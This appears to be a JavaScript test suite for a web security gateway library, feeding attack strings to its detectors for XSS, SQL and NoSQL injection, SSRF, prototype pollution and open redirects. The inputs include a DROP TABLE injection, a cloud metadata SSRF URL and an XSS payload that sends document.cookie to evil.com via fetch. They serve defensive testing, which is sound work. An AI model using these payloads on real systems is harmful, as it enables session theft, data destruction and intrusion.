/**
 * AWSG Comprehensive Test Suite
 * Tests all major attack vectors and functionality
 */

// Test utilities
const assert = (condition, message) => {
  if (!condition) {
    throw new Error(`Assertion failed: ${message}`);
  }
};

const testResults = {
  passed: 0,
  failed: 0,
  tests: []
};

function test(name, fn) {
  try {
    fn();
    testResults.passed++;
    testResults.tests.push({ name, status: 'PASS' });
    console.log(`✓ ${name}`);
  } catch (error) {
    testResults.failed++;
    testResults.tests.push({ name, status: 'FAIL', error: error.message });
    console.error(`✗ ${name}`, error.message);
  }
}

// ============================================================================
// SETUP
// ============================================================================

const security = createSecurityGateway({
  appId: 'test-app',
  logLevel: 'silent',
  dangerZone: ['/api/admin'],
  trustedOrigins: ['api.example.com'],
  maxRiskScore: 75,
  autoCSP: false, // Disable for testing
  behavioral: false // Disable for deterministic tests
});

// ============================================================================
// XSS TESTS
// ============================================================================

console.log('\n=== XSS Detection Tests ===');

test('Detects basic script tag XSS', () => {
  const result = security.detector.detectXSS('<script>alert("xss")</script>');
  assert(result.detected, 'Should detect script tag');
  assert(result.score > 0, 'Should have risk score');
});

test('Detects event handler XSS', () => {
  const result = security.detector.detectXSS('<img src=x onerror=alert(1)>');
  assert(result.detected, 'Should detect event handler');
});

test('Detects javascript: protocol XSS', () => {
  const result = security.detector.detectXSS('<a href="javascript:alert(1)">click</a>');
  assert(result.detected, 'Should detect javascript: protocol');
});

test('Detects iframe injection', () => {
  const result = security.detector.detectXSS('<iframe src="http://evil.com"></iframe>');
  assert(result.detected, 'Should detect iframe');
});

test('Detects encoded XSS attempts', () => {
  const result = security.detector.detectXSS('&#60;script&#62;alert(1)&#60;/script&#62;');
  assert(result.detected, 'Should detect HTML entity encoding');
});

test('Detects unicode evasion', () => {
  const result = security.detector.detectXSS('\\u003cscript\\u003ealert(1)\\u003c/script\\u003e');
  assert(result.detected, 'Should detect unicode evasion');
});

test('Allows safe HTML', () => {
  const result = security.detector.detectXSS('<p>Hello <b>World</b></p>');
  assert(!result.detected, 'Should allow safe HTML');
});

// ============================================================================
// SQL INJECTION TESTS
// ============================================================================

console.log('\n=== SQL Injection Tests ===');

test('Detects UNION SELECT attack', () => {
  const result = security.detector.detectSQLi("' UNION SELECT password FROM users--");
  assert(result.detected, 'Should detect UNION SELECT');
  assert(result.score >= 25, 'Should have high risk score');
});

test('Detects OR 1=1 tautology', () => {
  const result = security.detector.detectSQLi("admin' OR '1'='1");
  assert(result.detected, 'Should detect tautology');
  assert(result.score >= 30, 'Should detect tautology pattern');
});

test('Detects DROP TABLE attack', () => {
  const result = security.detector.detectSQLi("'; DROP TABLE users; --");
  assert(result.detected, 'Should detect DROP TABLE');
});

test('Detects stacked queries', () => {
  const result = security.detector.detectSQLi("admin'; DELETE FROM users WHERE '1'='1");
  assert(result.detected, 'Should detect stacked queries');
});

test('Detects blind SQLi with CONCAT', () => {
  const result = security.detector.detectSQLi("admin' AND CONCAT(version()) --");
  assert(result.detected, 'Should detect CONCAT function');
});

test('Allows legitimate SQL-like text', () => {
  const result = security.detector.detectSQLi("Please select your union representative");
  assert(!result.detected, 'Should allow normal text');
});

// ============================================================================
// NoSQL INJECTION TESTS
// ============================================================================

console.log('\n=== NoSQL Injection Tests ===');

test('Detects $where injection', () => {
  const result = security.detector.detectNoSQLi('{"username": {"$where": "this.password == \'pass\'"}}');
  assert(result.detected, 'Should detect $where');
});

test('Detects $ne operator abuse', () => {
  const result = security.detector.detectNoSQLi('{"username": {"$ne": null}}');
  assert(result.detected, 'Should detect $ne');
});

test('Detects $regex injection', () => {
  const result = security.detector.detectNoSQLi('{"username": {"$regex": ".*"}}');
  assert(result.detected, 'Should detect $regex');
});

test('Detects $gt operator', () => {
  const result = security.detector.detectNoSQLi('{"password": {"$gt": ""}}');
  assert(result.detected, 'Should detect $gt');
});

// ============================================================================
// SSRF TESTS
// ============================================================================

console.log('\n=== SSRF Detection Tests ===');

test('Blocks private IP 10.x.x.x', () => {
  const result = security.detector.detectSSRF('http://10.0.0.1/admin');
  assert(result.detected, 'Should block 10.x.x.x');
  assert(result.score === 100, 'Should have max risk score');
});

test('Blocks private IP 192.168.x.x', () => {
  const result = security.detector.detectSSRF('http://192.168.1.1/');
  assert(result.detected, 'Should block 192.168.x.x');
});

test('Blocks private IP 172.16-31.x.x', () => {
  const result = security.detector.detectSSRF('http://172.16.0.1/');
  assert(result.detected, 'Should block 172.16.x.x');
});

test('Blocks localhost', () => {
  const result = security.detector.detectSSRF('http://localhost:8080/admin');
  assert(result.detected, 'Should block localhost');
});

test('Blocks 127.0.0.1', () => {
  const result = security.detector.detectSSRF('http://127.0.0.1/secret');
  assert(result.detected, 'Should block 127.0.0.1');
});

test('Blocks 0.0.0.0', () => {
  const result = security.detector.detectSSRF('http://0.0.0.0:22/');
  assert(result.detected, 'Should block 0.0.0.0');
});

test('Blocks dangerous ports', () => {
  const result = security.detector.detectSSRF('http://example.com:22/');
  assert(result.detected, 'Should block SSH port');
  assert(result.score >= 80, 'Should have high risk for dangerous port');
});

test('Allows public URLs', () => {
  const result = security.detector.detectSSRF('https://api.example.com/data');
  assert(!result.detected, 'Should allow public URLs');
});

// ============================================================================
// PROTOTYPE POLLUTION TESTS
// ============================================================================

console.log('\n=== Prototype Pollution Tests ===');

test('Detects __proto__ pollution', () => {
  const payload = { "__proto__": { "isAdmin": true } };
  const result = security.detector.detectPrototypePollution(payload);
  assert(result.detected, 'Should detect __proto__');
  assert(result.score === 100, 'Should have max risk score');
});

test('Detects constructor pollution', () => {
  const payload = { "constructor": { "prototype": { "isAdmin": true } } };
  const result = security.detector.detectPrototypePollution(payload);
  assert(result.detected, 'Should detect constructor');
});

test('Detects nested prototype pollution', () => {
  const payload = {
    user: {
      profile: {
        "__proto__": { "role": "admin" }
      }
    }
  };
  const result = security.detector.detectPrototypePollution(payload);
  assert(result.detected, 'Should detect nested __proto__');
});

test('Allows safe objects', () => {
  const payload = { user: "john", role: "user", profile: { name: "John Doe" } };
  const result = security.detector.detectPrototypePollution(payload);
  assert(!result.detected, 'Should allow safe objects');
});

// ============================================================================
// OPEN REDIRECT TESTS
// ============================================================================

console.log('\n=== Open Redirect Tests ===');

test('Blocks untrusted redirects', () => {
  const result = security.detector.detectOpenRedirect('http://evil.com/phishing', []);
  assert(result.detected, 'Should block untrusted domain');
});

test('Allows trusted redirects', () => {
  const result = security.detector.detectOpenRedirect(
    'https://api.example.com/callback',
    ['api.example.com']
  );
  assert(!result.detected, 'Should allow trusted domain');
});

test('Blocks non-HTTPS untrusted', () => {
  const result = security.detector.detectOpenRedirect('http://untrusted.com/', ['example.com']);
  assert(result.detected, 'Should block HTTP to untrusted');
});

// ============================================================================
// SANITIZATION TESTS
// ============================================================================

console.log('\n=== Sanitization Tests ===');

test('Sanitizes script tags', () => {
  const input = '<script>alert("xss")</script>Hello';
  const safe = security.sanitize(input);
  assert(!safe.includes('<script>'), 'Should remove script tags');
  assert(safe.includes('Hello'), 'Should preserve safe content');
});

test('Sanitizes event handlers', () => {
  const input = '<img src=x onerror=alert(1)>';
  const safe = security.sanitize(input);
  assert(!safe.includes('onerror'), 'Should remove event handlers');
});

test('Sanitizes javascript: protocol', () => {
  const input = '<a href="javascript:alert(1)">click</a>';
  const safe = security.sanitize(input);
  assert(!safe.includes('javascript:'), 'Should remove javascript: protocol');
});

test('Returns null for unsafe objects', () => {
  const input = { "__proto__": { "isAdmin": true } };
  const safe = security.sanitize(input);
  assert(safe === null, 'Should return null for unsafe objects');
});

// ============================================================================
// CSRF PROTECTION TESTS
// ============================================================================

console.log('\n=== CSRF Protection Tests ===');

test('Generates CSRF token', () => {
  const token = security.getCSRFToken();
  assert(typeof token === 'string', 'Should return string token');
  assert(token.length > 0, 'Token should not be empty');
});

test('Token is consistent', () => {
  const token1 = security.getCSRFToken();
  const token2 = security.getCSRFToken();
  assert(token1 === token2, 'Token should be consistent');
});

test('Validates correct token', () => {
  const token = security.getCSRFToken();
  const valid = security.csrf.validateToken(token);
  assert(valid, 'Should validate correct token');
});

test('Rejects invalid token', () => {
  const valid = security.csrf.validateToken('invalid-token-12345');
  assert(!valid, 'Should reject invalid token');
});

test('Validates same-origin requests', () => {
  const origin = 'http://example.com';
  const referer = 'http://example.com/page';
  const valid = security.csrf.validateOrigin(origin, referer);
  assert(valid, 'Should validate same origin');
});

test('Rejects cross-origin requests', () => {
  const origin = 'http://evil.com';
  const referer = 'http://example.com/page';
  const valid = security.csrf.validateOrigin(origin, referer);
  assert(!valid, 'Should reject different origin');
});

// ============================================================================
// COMPREHENSIVE SCAN TESTS
// ============================================================================

console.log('\n=== Comprehensive Scan Tests ===');

test('Scans string inputs', () => {
  const result = security.detector.scan('<script>alert(1)</script>');
  assert(!result.safe, 'Should mark as unsafe');
  assert(result.riskScore > 0, 'Should have risk score');
  assert(result.threats.length > 0, 'Should identify threats');
});

test('Scans object inputs', () => {
  const payload = {
    username: "admin' OR '1'='1",
    data: { "__proto__": { "isAdmin": true } }
  };
  const result = security.detector.scan(payload);
  assert(!result.safe, 'Should mark as unsafe');
  assert(result.threats.length > 0, 'Should identify multiple threats');
});

test('Scans nested objects', () => {
  const payload = {
    user: {
      profile: {
        bio: '<script>alert(1)</script>'
      }
    }
  };
  const result = security.detector.scan(payload);
  assert(!result.safe, 'Should detect nested XSS');
});

test('Allows safe inputs', () => {
  const result = security.detector.scan('Hello, World!');
  assert(result.safe, 'Should mark safe input as safe');
  assert(result.riskScore === 0, 'Should have zero risk score');
});

test('Performance: scans complete within budget', () => {
  const payload = {
    field1: 'test data',
    field2: 'more test data',
    nested: { a: 1, b: 2, c: 3 }
  };
  const result = security.detector.scan(payload);
  assert(result.duration < 10, `Scan took ${result.duration}ms (budget: 10ms)`);
});

// ============================================================================
// UTILITY FUNCTION TESTS
// ============================================================================

console.log('\n=== Utility Tests ===');

test('Deep freezes objects', () => {
  const obj = { a: 1, b: { c: 2 } };
  const frozen = Utils.deepFreeze(obj);
  
  let errorThrown = false;
  try {
    frozen.a = 999;
  } catch (e) {
    errorThrown = true;
  }
  
  assert(Object.isFrozen(frozen), 'Should freeze object');
  assert(Object.isFrozen(frozen.b), 'Should freeze nested object');
});

test('Safe clones block __proto__', () => {
  const obj = {
    user: 'john',
    "__proto__": { isAdmin: true }
  };
  const cloned = Utils.safeClone(obj);
  assert(!('__proto__' in cloned), 'Should not copy __proto__');
  assert(cloned.user === 'john', 'Should copy safe properties');
});

test('Safe clones block constructor', () => {
  const obj = {
    data: 'test',
    "constructor": { prototype: { evil: true } }
  };
  const cloned = Utils.safeClone(obj);
  assert(!('constructor' in cloned), 'Should not copy constructor');
});

test('Normalizes URLs correctly', () => {
  const url = Utils.normalizeURL('HTTP://EXAMPLE.COM/Path');
  assert(url === 'http://example.com/Path', 'Should lowercase hostname');
});

test('Detects private IPs correctly', () => {
  assert(Utils.isPrivateIP('10.0.0.1'), 'Should detect 10.x.x.x');
  assert(Utils.isPrivateIP('192.168.1.1'), 'Should detect 192.168.x.x');
  assert(Utils.isPrivateIP('172.16.0.1'), 'Should detect 172.16.x.x');
  assert(!Utils.isPrivateIP('8.8.8.8'), 'Should allow public IP');
  assert(!Utils.isPrivateIP('example.com'), 'Should allow domains');
});

// ============================================================================
// INTEGRATION TESTS
// ============================================================================

console.log('\n=== Integration Tests ===');

test('Metrics collection works', () => {
  const metrics = security.getMetrics();
  assert(metrics.version, 'Should have version');
  assert(metrics.config, 'Should have config');
  assert(metrics.requests, 'Should have request metrics');
});

test('Log export works', () => {
  const log = security.exportLog();
  const parsed = JSON.parse(log);
  assert(parsed.timestamp, 'Should have timestamp');
  assert(parsed.metrics, 'Should have metrics');
});

test('Configuration is immutable', () => {
  let errorThrown = false;
  try {
    security.config.appId = 'hacked';
  } catch (e) {
    errorThrown = true;
  }
  assert(security.config.appId === 'test-app', 'Config should not change');
});

// ============================================================================
// REAL-WORLD ATTACK SIMULATION
// ============================================================================

console.log('\n=== Real-World Attack Simulation ===');

const attackVectors = [
  // XSS attacks
  '<script>document.cookie</script>',
  '<img src=x onerror=fetch("http://evil.com?cookie="+document.cookie)>',
  '<svg onload=alert(1)>',
  
  // SQL injection
  "admin'--",
  "' OR 1=1--",
  "'; DROP TABLE users;--",
  
  // NoSQL injection
  '{"$where": "this.password.length > 0"}',
  '{"$ne": null}',
  
  // Prototype pollution
  '{"__proto__": {"isAdmin": true}}',
  '{"constructor": {"prototype": {"role": "admin"}}}',
  
  // SSRF
  'http://localhost/admin',
  'http://192.168.1.1/',
  'http://169.254.169.254/latest/meta-data/'
];

test('Blocks 100% of attack vectors', () => {
  let blocked = 0;
  
  for (const attack of attackVectors) {
    const result = security.detector.scan(attack);
    if (!result.safe) {
      blocked++;
    }
  }
  
  const blockRate = (blocked / attackVectors.length) * 100;
  assert(blockRate === 100, `Block rate: ${blockRate}% (expected 100%)`);
});

// ============================================================================
// RESULTS
// ============================================================================

console.log('\n' + '='.repeat(50));
console.log('TEST RESULTS');
console.log('='.repeat(50));
console.log(`Total: ${testResults.passed + testResults.failed}`);
console.log(`Passed: ${testResults.passed} ✓`);
console.log(`Failed: ${testResults.failed} ✗`);
console.log(`Success Rate: ${((testResults.passed / (testResults.passed + testResults.failed)) * 100).toFixed(1)}%`);

if (testResults.failed > 0) {
  console.log('\nFailed Tests:');
  testResults.tests
    .filter(t => t.status === 'FAIL')
    .forEach(t => console.log(`  - ${t.name}: ${t.error}`));
}

console.log('='.repeat(50));

// Export for CI/CD
if (typeof module !== 'undefined' && module.exports) {
  module.exports = testResults;
}
